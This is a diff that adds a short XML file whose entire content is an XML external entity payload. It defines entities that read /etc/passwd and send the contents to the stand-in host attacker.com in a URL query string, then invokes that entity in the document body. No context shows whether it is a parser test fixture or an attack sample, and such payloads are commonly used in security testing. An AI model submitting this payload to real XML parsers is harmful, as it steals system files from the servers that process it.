@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % a SYSTEM "file:///etc/passwd">
+  <!ENTITY % b "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%a;'>">
+  %b;
+]>
+<root><data>&exfil;</data></root>
